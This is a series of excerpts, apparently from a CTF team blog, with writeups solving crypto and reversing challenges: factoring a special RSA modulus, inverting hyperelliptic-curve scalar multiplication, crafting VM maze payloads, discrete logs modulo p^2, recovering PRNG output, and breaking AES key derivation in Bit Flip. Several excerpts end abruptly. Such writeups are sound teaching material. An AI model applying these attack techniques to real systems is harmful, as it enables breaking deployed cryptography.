The code is pretty simple. It is just importing the number $p$ and $q$, and perform RSA encryption on the flag. Although the public key $N \\neq pq$ as textbook RSA, it won’t be a big problem as we could still find it’s totient function $\\varphi$ easily and calculate it’s private key $d$ if we could find $p$ and $q$.\nSo here’s the question, how could we find $p$ and $q$? Let’s see the hint.\nFinding $p$ and $q$ We could see that the hint gives us four variables, $w$, $x$, $y$ and $z$, where all of them are either in terms of $p$, $q$ and some constant. The program then asserts that:\n\\[w(xz + yz - xy) = 4xyz\\]\nSo lets expand it and make it become a multivariable equation in terms of $p$ and $q$ (and constant $w$):\n\\[ \\begin{aligned} f(p, q) = \u0026-4p^2q - (w-4)p^2 + (2w-10628)pq\\\\ \u0026\\quad-(2659w-10628)p + (2657w-7059648)q - (1767569w-7059648)\\\\ =\u0026\\ 0 \\end{aligned} \\]\nWell it seems so complicated... To be honest, I had no idea what I should do next when I expanded the equation like this. I had tried various methods such as making it into modular equations. But of course as expected, it didn’t work.\nWhen I was struggling with this equation, I suddenly noticed that there are only 2 positive terms in this equation, while the remaining 4 terms are negative terms. More importantly, by observing the degree of each terms, it seems that it's always likely that $f(p, q)$ will be negative no matter what $p$ and $q$ are. Therefore, I suspect that the maximum value of $f(p, q)$ would be 0 actually.\nSo lets assume $f(p_0, q_0)$ be the maximum point of $f(p, q)$. Then we can do partial differentiation on $f(p, q)$ to find out $p_0$ and $q_0$.\n\\[ \\begin{gathered} \\tfrac{\\partial f}{\\partial p} =-8pq - (2w-8)p + (2w-10628)q-(2659w-10628)\\\\ \\tfrac{\\partial f}{\\partial q} =-4p^2 + (2w-10628)p + (2657w-7059648) \\end{gathered} \\]\nFor maximum point, $f_p = 0$ and $f_q = 0$. It's difficult to solve $f_p$ as it's still having 2 variables. However, $f_q$ now remains $p$ as the only term as a quadratic equation! So we are able to solve for $p_0$!\nDoes the quadratic equation has real positive integer root? Yes! Here's the value of $p_0$:\np_0 = 12982730442374884692175714427854159342672585005900410914505931459344379272923599916417142168935973617313528952765371978277344412909738758472305039316830099 So let's plug the value of $p_0$ to $f_p = 0$, then we can solve for $q_0$:\nq_0 = 4376511920801673769046982367789644084746600661635151104602579081967083768976309788885633491753761209012042953502416064276555378570438196809829053232168930363213412874907199642703512833211163084612185095343783021125928854760406110492494016250237689683218940269389627326164130063600050024089561671913076715913062539181517022517918888557966172136200366952844819842691032260278270002343732370611629511112677638724984890716752906711541254394792207074699964511035503381 Finally, we use the value of $p_0$ and $q_0$ to check whether $w(xz + yz - xy) = 4xyz$ and it fits the equation! So the maximum point of $f(p, q)$ is really 0 and we have successfully retrive $p$ and $q$.\nThen the rest is easy. For textbook RSA, the totient function $\\varphi(pq) = (p-1)(q-1)$. In this case, the public key is not $pq$ but $p^3q$, so the totient function would be\n\\[\\varphi(p^3q) = p^2(p-1)(q-1).\\]\nThen we can get the private key $d$ like textbook RSA. Using the private key $d$, we could decrypt the flag. Flag: CHTB{Erdos-Straus-Conjecture}\nMe: Erdos-Straus-Conjecture? What is that?\nHyper Metroid  Dropping a morph ball bomb, Samus cracked open the floor and dropped down into the guts of Phaaze. At the end of the tunnel is a locked chest containing the hyper beam upgrade. Samus found the encrypted key preserved in a ball of glowing biomass, but can’t decode it. Help Samus capture the flag so she can eradicate the alien invasion once and for all.\n CHALLENGE from secrets import flag def alien_prime(a): p = (a^5 - 1) // (a - 1) assert is_prime(p) return p def encrypt_flag(): e = 2873198723981729878912739 Px = int.from_bytes(flag, \u0026#39;big\u0026#39;) P = C.lift_x(Px) JP = J(P) return e * JP def transmit_point(P): mumford_x = P[0].list() mumford_y = P[1].list() return (mumford_x, mumford_y) a = 1152921504606846997 alpha = 1532495540865888942099710761600010701873734514703868973 p = alien_prime(a) FF = FiniteField(p) R.\u0026lt;x\u0026gt; = PolynomialRing(FF) h = 1 f = alpha*x^5 C = HyperellipticCurve(f,h,\u0026#39;u,v\u0026#39;) J = C.jacobian() J = J(J.base_ring()) enc_flag = encrypt_flag() print(f\u0026#39;Encrypted flag: {transmit_point(enc_flag)}\u0026#39;) #Encrypted flag: ([1276176453394706789434191960452761709509855370032312388696448886635083641, 989985690717445420998028698274140944147124715646744049560278470410306181, 1], [617662980003970124116899302233508481684830798429115930236899695789143420, 429111447857534151381555500502858912072308212835753316491912322925110307]) The missing piece In the challenge, we are given a hyperelliptic curve $\\mathcal{C}$, a constant $e$ and a point $Q$ (the encrypted flag). The objective is to find the point $P$ such that $Q = eP$. Similar to elliptic curves and modular exponentation, we are able to compute the inverse of $e$ to compute $P$ once we have the order of the field.\nThe missing piece of this puzzle is the order of the Jacobian, $\\#J(\\mathcal{C})$ and there is no efficient algorithm to calculate it generally. That means, this hyperelliptic curve $\\mathcal{C}$ must be some special case so that we could caluclate its $\\#J(\\mathcal{C})$ easily.\nUsing my superior OSINT skills, I was able to find this special case in section 4.3.1 in A Comparison of Point Counting methods for Hyperelliptic Curves over Prime Fields and Fields of Characteristic 21.\nAs the same case mentioned in the paper, the prime $p$ generated in this challenge is a generalised Mersenne Prime (in a form of $\\frac{a^5-1}{a-1}$) and $\\alpha$ is also chosen such that\n\\[\\alpha^{(p-1)/5} \\equiv a\\ (\\text{mod}\\ p).\\]\nThis is exactly what we want and we could find out $\\#J(\\mathcal{C})$ in this challenge if we follow the paper!\nBut wait... multiplicative map?... automorphism?... What is $\\zeta$? Oh, it's roots of unity, ...what is that?\nI don't have much knowledge on mathematics that I totally can't understand what's the paper saying. Therefore, I found Mystiz in order to help but it seems that he can't understand the exact steps too... We then stucked there for about one and a half day just because we don't understand the mathematics in the paper.\nCryptosint In the paper, the author gave an example of the Mersenne Prime method and calculated the $\\#J(\\mathcal{C})$ in that example. However, it doesn't show the steps in the example. By skimming the paper, I suddenly noticed that at the end of the paper, the author stated that all code used for the paper is available at the website2.

If you win a smiley face on the remote server, you are additionally given the flag.\nSolution This challenge is solved by harrier in collaboration with Mystiz. The solution is written in the prespective of harrier.\nPart I: Reversing the virtual machine Since this is a reverse question with a binary, I decided to open it with IDA. This is a simple VM-type binary, with the instruction code stored directly inside.\nIt looked so simple to me at the beginning, and I wonder why no one has solved it? After a bit of reversing and dynamically debugging, I know I was wrong.\nThe code of the binary itself is simple. It is a simple VM with the below variables\n Eight one-byte state registers ($R_0, R_1, \u0026hellip;, R_7$), a two-byte instruction pointer ($p$), an one-byte direction register ($d=1, 2, 3, 4$) deciding how the instruction pointer move, an one-byte select register ($k$) deciding the index of register for subsequent operations, and 65536 one-byte memory ($M_0, M_1, \u0026hellip;, M_{65535}$) storing the instructions and data.  Moreover, each byte in the memory represents an instruction, and the instruction set is defined below.\n   Value Operation     0 do nothing   1 - 8 $k \\leftarrow 0$, \u0026hellip;, $k \\leftarrow 7$   9 - 16 $R_k \\leftarrow R_0$, \u0026hellip;, $R_k \\leftarrow R_7$   17 $R_k \\leftarrow R_k + 1$   18 $R_k \\leftarrow R_k - 1$   19 $R_k \\leftarrow R_6 + R_7$   20 $R_k \\leftarrow R_6 - R_7$   21 $R_k \\leftarrow R_6 \\times R_7$   22 $R_k \\leftarrow \\text{floor}(R_6 / R_7)$   23 $R_k \\leftarrow R_6\\ \\text{mod}\\ R_7$   24 $R_k \\leftarrow \\text{~}R_k$   25 $R_k \\leftarrow -R_k$   26 $R_k \\leftarrow R_6\\ \\text{and}\\ R_7$   27 $R_k \\leftarrow R_6\\ \\text{or}\\ R_7$   28 $R_k \\leftarrow R_6\\ \\text{xor}\\ R_7$   29 $R_k \\leftarrow R_6 == R_7$   30 $R_k \\leftarrow R_6 \u0026lt; R_7$   31 $256R_0+R_1 \\leftarrow p, R_2 \\leftarrow d$   32 keycheck   33 $R_k \\leftarrow M_{256R_0 + R_1}$   34 $M_{256R_0 + R_1} \\leftarrow R_k$   35 $p \\leftarrow 256R_0 + R_1, d \\leftarrow R_2$   36 $R_k \\leftarrow \\text{input}$   37 $\\text{print}\\ R_k$   38 - 41 $d \\leftarrow 1$, \u0026hellip;, $d \\leftarrow 4$    Keycheck is the only curious instruction, where I don\u0026rsquo;t really know why it even exists. While I was reversing, I am only able to realize it is used perform some fatal checks.\nPart II: Building an emulator As the VM code is so simple, I decided to write an emulator in Python for ease of testing. It is not hard to write an emulation given that I have fully reversed the VM.\nSince the instruction code is embedded in the binary, I used gef to extract the code part, and while in emulation I translate the code to human (me) readable instruction for further reverse. I thought I could get the flag by just reading and parsing the translated code, and figuring out the whole logic. I was wrong and it was far more complicated than that.\nWith the emulator I was able to produce some code trace with various input, here\u0026rsquo;s some debug log I generated, with state of the VM and instruction it ran:\nCurrent state: [0, 46, 1, 22, 41, 35, 23, 0] 6 50 / 16 0 50/16 REGSEL = 6 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 6 49 / 16 0 49/16 LOAD REG[6] 0/46 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 48 / 16 0 48/16 REGSEL = 7 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 47 / 16 0 47/16 REG[7] = REG[6] == REG[7] Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 16 0 46/16 KEYCHECK REG[7] OK Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 16 3 45/16 SETMODE 3 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 15 2 45/15 SETMODE 2 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 15 2 47/15 REG[7] = REG[4] a/b is the notation I used to express instruction pointers, hereby $p = 256a + b$.\nI yield thousands of debug lines like the one above, and I tried to reverse the input process logic, and I realize there is a loop to detect what is my input, and it loop through to see whether the input matched those in the accepted characters.\nHow the characters are matched? Only here I realize the meaning of the keycheck operation. It is simply an if: If the condition holds, the instruction pointer will move two steps forward. Otherwise it will move only one.\nAlso, I was able to generate a list of possible inputs for the first byte, but then I was stuck and didn\u0026rsquo;t know how to do.\nPart III: Visualizing the inner program This part is written in the prespective of Mystiz.\nI decided to join harrier on this challenge at some point of time. At that moment, he have reversed all of the VM and part of the inner program. I want to know what proportation of the inner program he has reversed.\nAt first, I tried to use graphviz for visualization. The results are pretty dull, and most nodes have both the in-degrees and out-degrees being one.\nThis is not surprising, since the nodes have out-degrees larger than one only if they are branches. However, one interesting point from this is, in most of the time, if x1/y1 transits to x2/y2, then $|x_1-x_2|+|y_1+y_2|=1$\u0026hellip; Sounds like they are transited to adjacent grids in each instruction. I recalled some esolangs like Piet and Befunge, where the instruction pointers are actually 2D-coordinates. Although they are not equal, I had an idea to transform the whole thing into a two-dimensional grid. Well, maybe I should use HTML tables to visualize this. Since harrier is tracing the instructions executed, I can integrate it and generate a heatmap to check what is being covered.\nWow, this is pretty impressive. Now we can see that only a small proportion of the code in the inner program is visited. One thing that caught our attention is the maze on the top-left corner. Well, it seemed impossible for us to traverse inside the maze, since there are no arrows and we are very likely unable to turn without arrows.\nWe are able to identify a few zones inside the internal program:\n Request for input Payload area Loop structure The failing and the winning gadgets Maze  Part IV: Generating random ideas While testing with random inputs, it seemed that the input will be filling in 35/22, 35/23 and etc.\nMy first idea is to see whether if we can overwrite 35/1 by overflowing the input buffer. I was expecting that the original code can be corrupted by writing up to 35/255, then it will be wrapped back to 35/0 and 35/1. Turns out this is not possible since only the bottom right zone, with dimensions $47\\times34$, could be overwritten, filling line by line. The excessive input will simply be ignored.\nFrom the visualization, we can see that there are several print gadgets. For example, there is a failing gadget (which prints :() on the bottom left input part that will be traversed when a character outside the character set is given. There is also one on the upper middle of the map and one in the top right. Mystiz has identified that the former one has the same instructions as the one on the bottom left, so it would also be a failing gadget. The objective is simple: To make the instruction pointer end up on the top-right part, on the winning gadget.\nTo achieve this, one idea we had is to find ways to jump to the winning gadget directly. We found that the instruction pointer will be moving into the payload area when we are given a sufficiently long input. Therefore we can actually execute the payloads we sent.\nKnowing that, we tried to use the set address instruction (byte 0x23) to jump to the win widget. Unfortunately this does not work, since 0x23 is not allowed as an input.\nWe then come up an idea to try to use the conditional keycheck operation on the side of the square to escape out of the box. However keycheck does not allow an arrow pointing to itself. This does not work as well.\nIt seems that the only possible way is to navigate in the maze properly to get to the win gadget. But how is it possible if the maze do not have arrows?\nWell, there is an untouched part of the program - the arrow-putting gadget. With $R_4 \u0026lt; 4$, it can be used to put arrows on to the maze with the set register instruction (byte 0x21). We reversed it and and expected that it behaves as the following Python code snippet:\nfor x in range(1, 21): for y in range(1, 21): # We are not allowed to overwrite the \u0026#34;load address\u0026#34; instructions # i.e., the walls. if M[256*x + y] == 0x23: continue if R[4] \u0026lt; 4: M[256 * x + y] = 0x26 + R[4] # 0x26 0x27 0x28 0x29 # ↑ → ↓ ← Our objective is updated once again. Now the goal is to craft a payload to put appropriate arrows to let us navigate through the maze.\nBut wait, there is a check after the maze. Basically, there are some instructions in the maze to write $R_3, R_4, R_5$ and $R_7$. All we need to do is to walk through the maze in a specific order to pass the check.\nSo we finally have a clear target: design a route for the maze to pass through all the checks and get to the winning gadget.\nPart V: Crafting a smiley face In each iteration, I can control 8 registers, initially with $R_0 = 0, R_1 = 5, R_6 = x$ and $R_7 = y$. Initially, I copied the coordinates by $R_2 \\leftarrow x$ and $R_3 \\leftarrow y$ for further operations. Moreover, $R_0$ and $R_1$ can be used to build up to an arbitrary number in a few instructions.\nThe idea is to encode few arrows into a vertical block.\nHowever, the size of our input is pretty small. We need to make use of some techniques to save space. For instance, we can encode few arrows into one condition (Instead of checking x == x0 and y == y0, we can use y \u0026gt; y0, y mod 6 or even x == y as long as it traverses to the goal).\nWriting the payload is tiring without some auxiliary tools, so I used spreadsheet to write the instructions and wrote a simple CSV parser to convert those instruction to the input payload. After some unknown hours of manual work, I have eventually crafted the payload. This is how it looks in spreadsheet. 🙈\nIt is then converted as a payload to the binary. This is the emulated result that eventually returns a smiley face.\nPart VI: Final thoughts It was really a fun reverse challenge, while being easy to begin yet challenging to finish. Every part of the challenge is well-designed. The maze, the constraints, and even the instructions that making this challenge to work. That was an exciting and mind-blowing experience to explore and dig into rabbit holes of the challenge bit by bit.\nThanks to Mystiz for the great insights and the visualization, I think having the visualization itself is already having half of the challenge solved. 😀\n","permalink":"https://b6a.black/posts/2021-02-09-dicectf-liye/","summary":"Lost in Your Eyes is a reverse engineering challenge in DiceCTF 2021 with ten solves (334 points).

I recalled from last year that they have cool challenges. This year, there are three crypto challenges. In particular, unevaluated is the hardest among them. Although I did not solve them, I dug into rabbit holes and had a lot of struggle, uh, fun.\nChallenge Summary There is a 128-bit prime $p$. Define $\\cdot: \\mathbb{Z}_{p^2}^2\\times\\mathbb{Z}_{p^2}^2\\rightarrow\\mathbb{Z}_{p^2}^2$ by\n\\[(x_1, y_1)\\cdot(x_2, y_2) := \\left(\\left(x_1x_2-y_1y_2\\right)\\ \\text{mod}\\ p^2, \\left(x_1y_2+y_1x_2\\right)\\ \\text{mod}\\ p^2\\right),\\]\nwhere $(x_1, y_1), (x_2, y_2) \\in \\mathbb{Z}_{p^2}^2$. Also, define for $k\\in\\mathbb{N}$ and $G \\in \\mathbb{Z}_{p^2}^2$, $G^k = G \\cdot G \\cdot ... \\cdot G$. Given that $G, H \\in \\mathbb{Z}_{p^2}^2$, the objective is to find $k\\in\\mathbb{N}\\cap\\left[0, 2^{256}\\right)$ such that $H = G^k$.\nSolution Clickbaited! This writeup is not original and has referred (or stolen) to several sources (Thanks rkm0959 and CryptoHack!). I would like to write this up for my own reference. Anyway, this is more like a story than a solution.  Part I: What is the order composed of? Since $p$ and $k$ are respectively 128 and 256 bits long, it is expected to recover two out of $k\\ \\text{mod}\\ p$, $k\\ \\text{mod}\\ q$ and $k\\ \\text{mod}\\ r$ to compute $k$. It is interesting to see the order being a product of three primes $p, q, r$, with $q | (p-1)$ and $r | (p+1)$.\nI have defined $\\text{norm}: \\mathbb{Z}_{p^2}^2 \\rightarrow \\mathbb{Z}_{p^2}$ by $\\text{norm}(x, y) = (x^2 + y^2)\\ \\text{mod}\\ p^2$ and experimented a bit and discovered some of the properties:\n The imaginary part of $G^{pr}$ is zero. $\\text{norm}(G^{pq}) = 1$, and  If we are working on $\\mathbb{Z}_p$ instead of $\\mathbb{Z}_{p^2}^2$, then\n The imaginary part of $G^r$ is zero. $\\text{norm}(G^q) = 1$, and  The following code snipped is used to verify the above properties.\n# Under mod n P = complex_pow(G, p*r, n) # P.im == 0 dQ = norm(complex_pow(G, p*q, n), n) # dQ == 1 # Under mod p P = complex_pow(G, r, p) # P.im == 0 dQ = norm(complex_pow(G, q, p), p) # dQ == 1 This make me think: If we consider a polar coordinate representation where $G = \\rho e^{i\\theta}$, with $\\rho\\in R$ and $\\theta\\in A$, then $R \\cong \\mathbb{Z}_{pq}$ and $A \\cong \\mathbb{Z}_{pr}$. Hence, we can imagine that the subgroup that $G$ generates is isomorphic to $\\mathbb{Z}_{pq}\\times\\mathbb{Z}_{pr}$.\nWell, they are not important though. This is interesting however.  Part II: Stealing the ideas from an existing cryptosystem Solving discrete log under modulo $n^2$ does not seem difficult. For example, we can see from Paillier cryptosystem that discrete logarithms under modulo $n^2$ can be computed easily. In this way, we can compute $x\\ \\text{mod}\\ p$ with:\n\\[x \\equiv \\frac{\\mathcal{L}(h^{p-1}\\ \\text{mod}\\ p^2)}{\\mathcal{L}(g^{p-1}\\ \\text{mod}\\ p^2)}\\ (\\text{mod}\\ p),\\]\nwhere $\\mathcal{L}(x) = \\frac{x-1}{p}$, like how a ciphertext is decrypted with the Paillier cryptosystem.

This reminded me the challenge galiver in ASIS CTF Finals 2020. I searched the discussion on CryptoHack's Discord server, and found...\nhellman's comment on galiver back then.  Okay, works for 128-bit $p$ rather fast. So this must be discrete logarithm. Let's try it? Since the imaginary part for $G^r, H^r$ are zero, I tried discrete_log(H^r, G^r, q) on Sage. After five minutes, my PC crashed. I could not solve it during the CTF. After the game, rkm0959 publishes the writeup on the CTF and he used h.log(g) and have got it working. In his writeup, he uses a norm map which is isomorphic to the subgroup that $G^r$ generates.\np = 206109322179011817882783419945552366363 q = 103054661089505908941391709972776183181 r = 17175776848250984823565284995462697197 G = (20878314020629522511110696411629430299663617500650083274468525283663940214962, 16739915489749335460111660035712237713219278122190661324570170645550234520364) H = (11048898386036746197306883207419421777457078734258168057000593553461884996107, 34230477038891719323025391618998268890391645779869016241994899690290519616973) Zp = GF(p) g = Zp(G[0]**2 + G[1]**2) # equivalently, g = Zp(complex_pow(G, r, p).re) h = Zp(H[0]**2 + H[1]**2) # and h = Zp(complex_pow(H, r, p).re) assert g^q == 1 x_mod_q = h.log(g) print(\u0026#39;x % q =\u0026#39;, x_mod_q) # 26176203815975575469683683780455489251 Takeaway.

I knew nothing on hyperelliptic curves prior to the CTF. The writeup is solely based on what I learnt during the game, and may not be accurate. If you found a mistake, please do not hesitate to contact me. Many thanks! :smile:\n Challenge Summary In this series of challenge, the message Hello! The flag is: hxp{...} is xorred with an bytestream generated by an PRNG. In particular, the only difference between hyper (crypto, 294 points) and hyperhyper (crypto, 714 points) is the message lengths, respectively 45 and 93.\nWithout doubt, the most crucial element for this challenge is the PRNG, which is based on Jacobian of hyperelliptic curves. In this challenge, the Jacobian $\\mathcal{J}$ of a hyperelliptic curve $\\mathcal{H}$ of genus 3 over $\\mathbb{Z}_p$ is used. $\\mathcal{H}$ is defined by:\n\\[\\mathcal{H}: y^2 \\equiv x^7 + x\\ (\\text{mod}\\ p).\\]\nThree constant points $G_1, G_2, G_3$ from $\\mathcal{J}$ are picked and three integers $k_1, k_2, k_3$ are picked randomly as the seed. Finally, define $H_n \\in \\mathcal{J}$ by $H_n := k_1^nG_1 + k_2^nG_2 + k_3^nG_3$ for $n\\in\\mathbb{N}$. If we write $H_n = \\left(u_n\\left(x\\right), v_n\\left(x\\right)\\right)$, where\n\\[\\begin{cases} u_n(x) := u_{n0} + u_{n1} x + u_{n2} x^2 + u_{n3} x^3 \\\\ v_n(x) := v_{n0} + v_{n1} x + v_{n2} x^2 \\end{cases},\\]\nthen the random stream would be $(u_{10}, u_{11}, u_{12}, v_{10}, v_{11}, v_{12}, u_{20}, u_{21}, ...)$, where each of $u_{ij}$ and $v_{ij}$'s is of 8 bytes.\nSolution Part I: Comparing hyper and hyperhyper One thing that made me very curious at first glance: We are given 24 bytes of the random bytestream from the known message in both hyper and hyperhyper, why is hyperhyper an independent question? If we are able to recover internal state for the PRNG, wouldn't it be evident to solve the both parts?\nOf course, I would have not questions if I have understood the PRNG. Since the first 24 bytes are known, we have $u_1(x)$. For hyper, we gotta recover the following 21 bytes, which is enough by recovering $v_1(x)$. After all, the points are given in Mumford representation. With that said, if a point $P\\left(u\\left(x\\right), v\\left(x\\right)\\right)\\in\\mathcal{J}$, the below properties are satisfied1:\n  $u(x)$ is monic, $f(x) \\equiv [v(x)]^2\\ \\left(\\text{mod}\\ u\\left(x\\right)\\right)$, and $\\deg\\left(v\\left(x\\right)\\right) \u0026lt; \\deg\\left(u\\left(x\\right)\\right) \\leq 3$.   It is hinted from the second property that the objective is to find a modular square root for $f(x)$ under modulo $u(x)$.\nPart II: Midnight thoughts It was midnight when I realize this and I could not immediately think of an appropriate approach. I was even once expanding everything:\nSuppose that we have $u(x) := x^3 + rx^2 + sx + t$ and $v(x) := ax^2 + bx + c$. Then the following modular congruences hold:\n\\[\\begin{cases} -r^5 + 4r^3s - 3r^2t - 3rs^2 + 2st - a^2r^2 + 2abr + a^2s - 2ac - b^2 \\equiv 0 \\\\ -r^4s + 3r^2s^2 - 4rst - s^3 + r^3t + t^2 + 1 - a^2rs + 2abs + a^2t - 2bc \\equiv 0 \\\\ -r^4t + 3r^2st - 2rt^2 - s^2t - a^2rt + 2abt - c^2 \\equiv 0 \\end{cases}(\\text{mod}\\ p).\\]\nI must be very sleepy back then.\nPart III: Wake up, wake up! After [enter an arbitrary number] hours of sleep, I woke up and immediately recalled Tonelli-Shanks algorithm. Basically we are able to apply the algorithm to compute modular square root, even with modulo $u(x)$. Since $u(x)$ is a degree 3 polynomial over $\\mathbb{Z}_p$, the order for $\\mathcal{G} := \\text{GF}(p)[x]/u(x)$ would be a factor of $p^3 - 1$. Knowing the order, we can apply Tonelli-Shanks to compute a modular square root for $f(x)$. After all, $v(x)$ would be one of them.\nThe rest is trivial after we have $v_1(x)$ computed. Xorring the output with the keystream, we have the message: Hello! The flag is: hxp{ez_P4rT_i5_ez__tL0Cm}.\nPart IV: Mysteries of hyperelliptic curves I am not going to talk about solutions anymore. This section contains a list of unproved properties which looked truthy for me. Those questions came to my mind while attempting hyperhyper, while I have no proofs. The questions are no means useful for solving the questions, but I think they are helpful in pairing-based cryptography. They are very likely used somewhere anyway.  Let $\\mathcal{J}$ be the Jacobian of a hyperelliptic curve of genus 3. Suppose that $\\sigma$ is the order of $G_1, G_2, G_3\\in\\mathcal{J}$.\n Question 1. Is $a_1G_1 + a_2G_2 + a_3G_3$ also has an order $\\sigma$ given that $gcd(a_i, \\sigma)=1$? Question 2. Define $S := \\{k_1G_1 + k_2G_2 + k_3G_3 \\in \\mathcal{J}: k_1, k_2, k_3\\in\\mathbb{Z}\\}$. Is $\\left|S\\right| = \\sigma^3$? Question 3. Let $(\\mathbb{Z}_p^3, +)$ be a group and define $x = (x_1, x_2, x_3), y = (y_1, y_2, y_3) \\in\\mathbb{Z}_p^3$. Suppose $x+y = (x_1+y_1, x_2+y_2, x_3+y_3)$. Is $(\\mathbb{Z}_p^3, +)$ isomorphic to $S$?

There are big brain moments and I have been mind-blown for multiple times during the game. This time we have teamed up with @blackb6a. I have solved all the crypto challenges and two challenges with my teammates.\nThere are three challenges writeup in this post:\n Bit Flip (parts 2 and 3) Frying in motion babykok  Bit Flip (Crypto, 155+324+343 points) Solved by Mystiz.\nChallenge Summary At the beginning, a 128-bit alice_secret (denoted as $a$) is generated. We are given an oracle that allows us to input a 256-bit value $v$. An PRNG $R$ uses $a\\oplus v$ to derive:\n a 512-bit prime $p$ that is used for Diffie-Hellman, and a 64-bit secret $a$ that is Alice's secret key.  For each oracle call, the following will be printed\n The number of rng.getbits(512) calls for $p$ to be a prime, Bob's public key (which is generated randomly in each call), $B$, The encrypted flag (with AES-CBC \u0026amp; key is derived from the DH shared key):  Of course, the devil is in the detail. The AES-CBC key is derived as follows:\ndh_shared_key = 1337 ^ pow(B, a, p) key = long_to_bytes(dh_shared_key, 16)[:16] Furthermore, the PRNG is simple. It is maintaining a 256-bit state $s$. 512-bit and 64-bit numbers are generated respectively with:\ndef getbits(bits=512): output = sha256(long_to_bytes(s, 32)).digest() + sha256(long_to_bytes(s+1, 32)).digest() s += 2 return output def getbits(bits=64): output = sha256(long_to_bytes(s, 32)).digest()[-8:] s += 1 return output The plot twist This is the setting for part one. Parts two and three are pretty similar though.\n Parts 2 and 3 are not returning Bob's public key, and Part 3 uses the prime $p$ and check if $q := 2p+1$ is a prime. The prime $q$ (instead of $p$) is used for DH.  Solution Part I: The real bit-flipping Bit Flip 1 was solved in about 45 minutes. Basically we are able to recover $v$ from the number of rng.getbits(512) calls. Since I am sure that there will be writeups on this part available online, I am skipping this part.\nI am just going to admit that I am lazy.  Part II: A nightmare on long_to_bytes Bit Flip 3 was solved in 1 hour - and we were the first to solve. But wait, why isn't part II on Bit Flip 2? The reason is simply because just I cannot solve it (yet).\ndefund had the same question, too.  The prime used for Diffie-Hellman can be 513-bit long. This makes the AES key derivation interesting - as long_to_bytes(x, 16) actually prepend null bytes until the output size is a multiple of 16. For example:\n\u0026gt;\u0026gt;\u0026gt; long_to_bytes(2**127, 16).hex() \u0026#39;80000000000000000000000000000000\u0026#39; \u0026gt;\u0026gt;\u0026gt; long_to_bytes(2**128, 16).hex() \u0026#39;0000000000000000000000000000000100000000000000000000000000000000\u0026#39; Luckily (or unluckily) the shared key can be as large as 513 bits long. In that case, the first block would be 00 00 ... 00 00 01 - and this is the AES key.\nWe do not even need to know Alice's nor Bob's key. Basically there is around 25% chance for the DH shared key to be 513-bit. When it happens, the constant key is used and we are able to decrypt the flag - DrgnS{C0nst_A3S_K3y_1111111111111!}. First blood 🩸!\nPart III: Playing mind-games on Bit Flip 2 Bit Flip 2 was solved in about 12 hours. I was mind-blown when I know da wae. Since the DH key could never be 513 bits long anymore, we can no longer exploit in the way as described in Bit Flip 3.\nWait. This made me very puzzled: How do we find the shared key (or $g^{ab}\\ (\\text{mod}\\ p)$) if Bob is not telling us anything?  Basically we have three options:\n Make $a = 0$. This implies that $g^{ab} \\equiv 1$, resulting in a constant key. Find $a$ and $p$ such that $g^a\\in\\mathbb{Z}_p^*$ has a small order. Hence $\\{g^{ab}\\in\\mathbb{Z}_p^*\\ |\\ b\\in\\mathbb{Z}\\}$ can be exhausted feasibly. Make $p$ 385-bit long (or 1-bit, 129-bit or 257-bit). Then we are able to reuse the exploit on Bit Flip 3.  There is a point of time that over 10 teams have solved Bit Flip 2 while only hxp and us have solved Bit Flip 3. If option 3 is the way to go, the number of solves would not be the same. Moreover, option 2 is barely possible in a perspective of math. That said, unless there is a vulnerability that I am not awared of, we may need to make $a = 0$. That is equivalent to rng.getbits(64) == 0 and thus a 64-bit proof-of-work. Possible?\nDuring the research, I was wondering if there is a proof-of-work database that has a list of payloads with many trailing zeros as its hash. I was even wondering if there is someone ever able to solve a 64-bit proof-of-work (particularly on SHA256). Turns out I am too naive - some are able to solve a 76-bit proof-of-work in around 10 minutes. Who? The bitcoin network.\nLet's appreciate the number of zeros...  The block hashing algorithm for Bitcoin is SHA256. This is how block 125552 (the smallest hash as of June 2011) is computed:\nd = bytes.fromhex(\u0026#39;0100000081cd02ab7e569e8bcd9317e2fe99f2de44d49ab2b8851ba4a30\u0026#39; + \u0026#39;8000000000000e320b6c2fffc8d750423db8b1eb942ae710e951ed797f7\u0026#39; + \u0026#39;affc8892b0f1fc122bc7f5d74df2b9441a42a14695\u0026#39;) m = hashlib.sha256(d).digest() print(m.hex()) # b9d751533593ac10cdfb7b8e03cad8babc67d8eaeac0a3699b82857dacac9390 h = hashlib.sha256(m).digest() print(h.hex()) # 1dbd981fe6985776b644b173a4d0385ddc1aa2a829688d1e0000000000000000 The above hash ends with 8 null bytes. If the below seed generates a prime in its first call of rng.getbits(512), then a = 0:\nseed = 0xb9d751533593ac10cdfb7b8e03cad8babc67d8eaeac0a3699b82857dacac938c.\nUnfortunately it is not. Luckily there are many inputs (available on the Bitcoin network) that generates eight trailing null bytes as its hash. We can simply look at the blocks and find the one we need. For me, I was using the block API from blockcypher.com to retrieve and compute the preimage of hashes. Eventually block 657972 satisfies our needs and the Alice's secret key will be $a = 0$.\nThat said, the AES key would be 00 00 ... 00 05 38 when $a = 0$ - and we are able to decrypt the flag: DrgnS{B1tc0in_p0w3r_crypt0_brut3}! :tada:\nFrying in motion (Crypto, 324 points) Solved by Mystiz.\nChallenge Summary The challenge is simple. Upon connecting to the challenge server,\n 257 HEX characters are generated, strfry-ed for 0x140000 times. Nothing is returned. (This took around 5 seconds) Players are allowed to send up to 4096 bytes. The server returns the strfry-ed input. 64 HEX characters (denote as fry_buf) strfry-ed and returned. The player is expected to find fry_buf.  More importantly, the challenge server has a timeout of 20 seconds. Hence, you have to compute from the strfry-ed response in 15 seconds.\nSolution Part I: The first encounter  \u0026quot;WTF. Yet another strfry question? It must be very boring.\u0026quot; ~ Mystiz\n This is the first comment I made to the challenge. It is actually much interesting than I thought and I have spent a good 5 hours for the challenge.\nThe previous CTFs (for example, challenge from ångstromCTF 2020 and DawgCTF 2020) exploited on the small seed space that can be exhausted. In the previous versions of libc, the seeds for strfry is given by time(NULL) ^ getpid(). I was trying to print time(NULL) and getpid() alongside with the strfry result, but the seed does not check out. What? Maybe the world is not peaceful anymore in libc 2.31-0ubuntu9. Let's download the source code and have a read.\nPart II: Code-reading game Let's verify the first point - is the implementation for strfry changed?\n// string/strfry.c  char * strfry (char *string) { // omitted...  if (!init) { 